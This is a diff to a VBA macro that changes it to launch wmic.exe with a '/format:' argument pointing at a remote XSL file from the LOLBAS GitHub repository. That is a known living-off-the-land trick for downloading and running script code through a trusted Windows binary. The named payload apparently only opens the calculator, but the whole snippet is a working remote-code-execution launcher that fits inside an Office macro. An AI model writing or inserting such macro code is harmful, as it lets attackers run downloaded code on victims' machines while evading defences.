@@ -2,8 +2,8 @@ Public Sub StartExeWithArgument()
     Dim strProgramName As String
     Dim strArgument As String
 
-    strProgramName = "C:\windows\syswow64\wmic.exe"
-    strArgument = "/G"
+    strProgramName = "C:\windows\syswow64\wbem\wmic.exe"
+    strArgument = "os get /format:'https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl'"
 
     Call Shell("""" & strProgramName & """ """ & strArgument & """", vbNormalFocus)
 End Sub
